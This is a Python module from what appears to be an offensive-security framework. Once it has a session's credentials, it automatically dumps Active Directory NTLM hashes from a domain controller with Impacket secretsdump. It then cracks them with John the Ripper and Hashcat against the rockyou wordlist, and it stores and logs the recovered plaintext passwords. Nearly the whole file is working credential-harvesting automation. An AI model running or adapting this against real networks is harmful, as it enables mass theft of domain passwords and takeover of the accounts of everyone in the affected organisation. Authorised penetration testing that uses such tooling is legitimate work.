"""
Automated Hash Dump and Crack Module
Integrates with CrackSession for automatic credential harvesting
"""

import os
import shutil
import subprocess
import tempfile
from datetime import datetime

from cyberapp.models.db import db_conn
from cyberapp.models.credentials import CredentialStore


# Tool paths
TOOLS = {
    "john": "/usr/bin/john",
    "john_bin": "/usr/sbin/john",
    "hashcat": "/usr/bin/hashcat",
    "hashcat_bin": "/usr/sbin/hashcat",
    "secretsdump": "/opt/impacket/examples/secretsdump.py",
    "secretsdump_alt": "/usr/bin/secretsdump.py",
    "mimikatz": "/opt/tools/mimikatz.exe",
}

# Default wordlist
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
SECLISTS_PATH = "/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt"

if os.path.exists(SECLISTS_PATH):
    DEFAULT_WORDLIST = SECLISTS_PATH


class HashDumpEngine:
    """
    Otomatik hash toplama ve crack motoru
    CrackSession açıldıktan sonra otomatik olarak çalıştırılır
    """
    
    def __init__(self, scan_id, session_info=None):
        self.scan_id = scan_id
        self.session_info = session_info  # {'target': '10.10.10.1', 'username': 'admin', 'password': 'pass', 'domain': 'CORP'}
        self.hashes = []  # Toplanan hashler
        self.cracked = []  # Cracked sonuçlar
        self.wordlist = DEFAULT_WORDLIST
        
    def log_to_intel(self, msg_type, message):
        """Intel tablosuna log yaz"""
        try:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data, timestamp) VALUES (?, ?, ?, datetime('now'))",
                    (self.scan_id, msg_type, message)
                )
                conn.commit()
        except Exception as e:
            print(f"[HASH_DUMP] Intel log error: {e}")
    
    def log(self, message):
        """Console log"""
        print(f"[HASH_DUMP] [{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def check_tool(self, tool_key):
        """Tool'un sistemde olup olmadığını kontrol et"""
        tool_path = TOOLS.get(tool_key)
        if not tool_path:
            return False
        return os.path.exists(tool_path) or shutil.which(tool_path.split('/')[-1])
    
    # ==================== HASH EXTRACTION METHODS ====================
    
    def extract_via_secretsdump(self, target, username, password, domain=""):
        """
        Impacket secretsdump ile remote hash extraction
        En yaygın kullanılan method - NTDS.dit extract
        """
        self.log(f"Extracting hashes from {target} via secretsdump...")
        
        # secretsdump path'ini bul
        secretsdump_path = None
        for path in [TOOLS["secretsdump"], TOOLS["secretsdump_alt"]]:
            if os.path.exists(path):
                secretsdump_path = path
                break
        
        if not secretsdump_path:
            # Try which command
            result = subprocess.run(["which", "secretsdump.py"], capture_output=True, text=True)
            if result.returncode == 0:
                secretsdump_path = result.stdout.strip()
        
        if not secretsdump_path:
            self.log("secretsdump.py not found!")
            return {"success": False, "error": "secretsdump not found"}
        
        # Domain formatını düzelt
        if domain and not domain.endswith("\\"):
            domain = domain + "\\"
        
        # Komutu oluştur
        cmd = [
            "python3", secretsdump_path,
            f"{domain}{username}:{password}@{target}",
            "-just-dc",
            "-output-file", f"/tmp/ntds_{self.scan_id}"
        ]
        
        self.log(f"Running: {' '.join(cmd[:3])}...")
        
        try:
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=600
            )
            
            # Output dosyalarını kontrol et
            ntds_file = f"/tmp/ntds_{self.scan_id}.ntds"
            if os.path.exists(ntds_file):
                with open(ntds_file, 'r') as f:
                    content = f.read()
                return self._parse_ntds_content(content)
            elif result.returncode != 0:
                self.log(f"secretsdump failed: {result.stderr}")
                return {"success": False, "error": result.stderr}
            else:
                return self._parse_secretsdump_output(result.stdout)
                
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Timeout expired (600s)"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def extract_from_lsass(self, target, username, password, domain=""):
        """
        LSASS memory dump ile hash extraction
        Not: Local admin gerektirir
        """
        # Placeholder for future implementation
        self.log("LSASS extraction not yet implemented")
        return {"success": False, "error": "LSASS extraction not implemented"}
    
    def extract_via_wmi(self, target, username, password, domain=""):
        """
        WMI üzerinden registry hives çekme
        LocalSystem yetkisi gerektirir
        """
        # Placeholder for future implementation
        self.log("WMI extraction not yet implemented")
        return {"success": False, "error": "WMI extraction not implemented"}
    
    def add_manual_hash(self, username, nthash, lmhash, hash_type="NTLM", hostname=None):
        """
        Manuel hash ekleme (örneğin local machine'den)
        """
        hash_entry = {
            "username": username,
            "nthash": nthash,
            "lmhash": lmhash,
            "hash_type": hash_type,
            "hostname": hostname or self.session_info.get("target", "unknown"),
            "source": "manual"
        }
        self.hashes.append(hash_entry)
        
        # DB'ye kaydet
        CredentialStore.save_hash_dump(
            self.scan_id,
            hash_entry["hostname"],
            hash_type,
            username,
            nthash,
            lmhash
        )
        
        self.log(f"Added manual hash for {username}")
        return hash_entry
    
    # ==================== PARSING METHODS ====================
    
    def _parse_ntds_content(self, content):
        """
        NTDS.dit extract output'unu parse et
        Format: username:rid:lmhash:nthash:::
        """
        hashes = []
        for line in content.split('\n'):
            line = line.strip()
            if not line or ':' not in line:
                continue
            
            parts = line.split(':')
            if len(parts) >= 4:
                username = parts[0]
                rid = parts[1]
                lmhash = parts[2]
                nthash = parts[3]
                
                hash_entry = {
                    "username": username,
                    "nthash": nthash,
                    "lmhash": lmhash,
                    "hash_type": "NTLM",
                    "hostname": self.session_info.get("target", "ntds"),
                    "source": "ntds"
                }
                self.hashes.append(hash_entry)
                hashes.append(hash_entry)
        
        self.log(f"Parsed {len(hashes)} hashes from NTDS")
        
        # DB'ye kaydet
        for h in hashes:
            CredentialStore.save_hash_dump(
                self.scan_id,
                h["hostname"],
                h["hash_type"],
                h["username"],
                h["nthash"],
                h["lmhash"]
            )
        
        return {"success": True, "count": len(hashes), "hashes": hashes}
    
    def _parse_secretsdump_output(self, output):
        """secretsdump stdout parse et"""
        # Base64 veya inline format
        lines = output.split('\n')
        return {"success": True, "raw": output[:1000]}
    
    # ==================== CRACKING METHODS ====================
    
    def crack_with_john(self, hash_file, wordlist=None):
        """
        John the Ripper ile hash cracking
        """
        if not wordlist:
            wordlist = self.wordlist
        
        john_path = None
        for path in [TOOLS["john"], TOOLS["john_bin"]]:
            if os.path.exists(path):
                john_path = path
                break
        
        if not john_path:
            result = subprocess.run(["which", "john"], capture_output=True, text=True)
            if result.returncode == 0:
                john_path = result.stdout.strip()
        
        if not john_path:
            return {"success": False, "error": "John not found"}
        
        if not os.path.exists(wordlist):
            return {"success": False, "error": f"Wordlist not found: {wordlist}"}
        
        self.log(f"Running John with wordlist: {wordlist}")
        
        cmd = [john_path, f"--wordlist={wordlist}", hash_file, "--format=nt"]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600  # 1 saat timeout
            )
            
            # John sonuçlarını al
            show_cmd = [john_path, "--show", hash_file, "--format=nt"]
            show_result = subprocess.run(show_cmd, capture_output=True, text=True)
            
            cracked = self._parse_john_cracked(show_result.stdout)
            
            return {
                "success": True,
                "tool": "john",
                "cracked": cracked,
                "stdout": result.stdout,
                "stderr": result.stderr
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def crack_with_hashcat(self, hash_file, wordlist=None):
        """
        Hashcat ile hash cracking
        """
        if not wordlist:
            wordlist = self.wordlist
        
        hashcat_path = None
        for path in [TOOLS["hashcat"], TOOLS["hashcat_bin"]]:
            if os.path.exists(path):
                hashcat_path = path
                break
        
        if not hashcat_path:
            result = subprocess.run(["which", "hashcat"], capture_output=True, text=True)
            if result.returncode == 0:
                hashcat_path = result.stdout.strip()
        
        if not hashcat_path:
            return {"success": False, "error": "Hashcat not found"}
        
        if not os.path.exists(wordlist):
            return {"success": False, "error": f"Wordlist not found: {wordlist}"}
        
        self.log(f"Running Hashcat with wordlist: {wordlist}")
        
        # NTLM = 1000
        cmd = [
            hashcat_path,
            "-m", "1000",  # NTLM
            "-a", "0",     # Straight mode
            hash_file,
            wordlist,
            "--outfile", f"/tmp/hashcat_{self.scan_id}.out",
            "--outfile-format", "2"  # username:password
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600
            )
            
            # Sonuçları oku
            output_file = f"/tmp/hashcat_{self.scan_id}.out"
            cracked = {}
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            cracked[parts[0]] = parts[1] if len(parts) == 2 else ':'.join(parts[1:])
            
            return {
                "success": True,
                "tool": "hashcat",
                "cracked": cracked,
                "stdout": result.stdout,
                "stderr": result.stderr
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _parse_john_cracked(self, output):
        """John --show output'unu parse et"""
        cracked = {}
        for line in output.strip().split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    username = parts[0]
                    password = ':'.join(parts[1:])
                    if password and password != "(null)":
                        cracked[username] = password
        return cracked
    
    # ==================== AUTO CRACK WORKFLOW ====================
    
    def auto_crack_all(self, wordlist=None):
        """
        Tüm toplanan hashleri otomatik crack et
        John ve Hashcat'i sırayla dener
        """
        if not self.hashes:
            self.log("No hashes to crack!")
            return {"success": False, "error": "No hashes collected"}
        
        if not wordlist:
            wordlist = self.wordlist
        
        all_cracked = {}
        
        for idx, hash_entry in enumerate(self.hashes):
            username = hash_entry["username"]
            nthash = hash_entry["nthash"]
            lmhash = hash_entry.get("lmhash", "")
            
            # NTLM formatında geçici dosya oluştur
            # Format: username:id:lmhash:nthash:::
            hash_content = f"{username}:{hash_entry.get('rid', '500')}:{lmhash}:{nthash}:::"
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(hash_content)
                hash_file = f.name
            
            try:
                self.log(f"Cracking hash for {username}...")
                
                # Önce John dene
                john_result = self.crack_with_john(hash_file, wordlist)
                
                cracked_password = None
                if john_result.get("success") and john_result.get("cracked"):
                    if username in john_result["cracked"]:
                        cracked_password = john_result["cracked"][username]
                
                # John başarısız olursa Hashcat dene
                if not cracked_password:
                    hashcat_result = self.crack_with_hashcat(hash_file, wordlist)
                    if hashcat_result.get("success") and hashcat_result.get("cracked"):
                        if username in hashcat_result["cracked"]:
                            cracked_password = hashcat_result["cracked"][username]
                
                if cracked_password:
                    self.log(f"[CRACKED] {username}:{cracked_password}")
                    all_cracked[username] = cracked_password
                    
                    # DB'ye kaydet
                    CredentialStore.save_cracked_password(
                        self.scan_id,
                        username,
                        cracked_password,
                        hash_entry["source"]
                    )
                    
                    # Intel'e yaz
                    self.log_to_intel(
                        "HASH_CRACKED",
                        f"{username}:{cracked_password} (source: {hash_entry['source']})"
                    )
                    
                    self.cracked.append({
                        "username": username,
                        "password": cracked_password,
                        "hash_source": hash_entry["source"]
                    })
                else:
                    self.log(f"[UNCRACKED] {username}")
                    
            finally:
                os.remove(hash_file)
        
        return {
            "success": True,
            "total_hashes": len(self.hashes),
            "cracked_count": len(all_cracked),
            "cracked": all_cracked
        }
    
    # ==================== MAIN EXECUTION ====================
    
    def execute_session_hook(self):
        """
        CrackSession açıldığında bu fonksiyon çağrılır
        Otomatik olarak hashdump + crack işlemini başlatır
        """
        if not self.session_info:
            self.log("No session info provided!")
            return {"success": False, "error": "No session info"}
        
        target = self.session_info.get("target")
        username = self.session_info.get("username")
        password = self.session_info.get("password")
        domain = self.session_info.get("domain", "")
        
        if not all([target, username, password]):
            self.log("Missing required session credentials!")
            return {"success": False, "error": "Missing credentials"}
        
        self.log(f"Starting automated hash dump for {target}")
        
        # 1. Hash extraction
        extract_result = self.extract_via_secretsdump(target, username, password, domain)
        
        if not extract_result.get("success"):
            self.log(f"Hash extraction failed: {extract_result.get('error')}")
            return extract_result
        
        # 2. Auto crack
        crack_result = self.auto_crack_all()
        
        # 3. Final intel report
        self.generate_intel_report()
        
        return {
            "success": True,
            "extraction": extract_result,
            "cracking": crack_result,
            "total_cracked": len(self.cracked)
        }
    
    def generate_intel_report(self):
        """
        Intel tablosu için özet rapor oluştur
        """
        if self.cracked:
            report = f"=== HASH CRACK REPORT ===\n"
            report += f"Total hashes: {len(self.hashes)}\n"
            report += f"Cracked: {len(self.cracked)}\n\n"
            report += "Cracked Credentials:\n"
            for c in self.cracked:
                report += f"  {c['username']}:{c['password']} ({c['hash_source']})\n"
            
            self.log_to_intel("CRACK_REPORT", report)
        else:
            self.log_to_intel("CRACK_REPORT", f"No credentials cracked from {len(self.hashes)} hashes")


# ==================== HELPER FUNCTIONS ====================

def log_to_intel(scan_id, msg_type, message):
    """Intel tablosuna log yaz - modül dışından çağrılabilir"""
    try:
        with db_conn() as conn:
            conn.execute(
                "INSERT INTO intel (scan_id, type, data, timestamp) VALUES (?, ?, ?, datetime('now'))",
                (scan_id, msg_type, message)
            )
            conn.commit()
    except Exception as e:
        print(f"[HASH_DUMP] Intel log error: {e}")
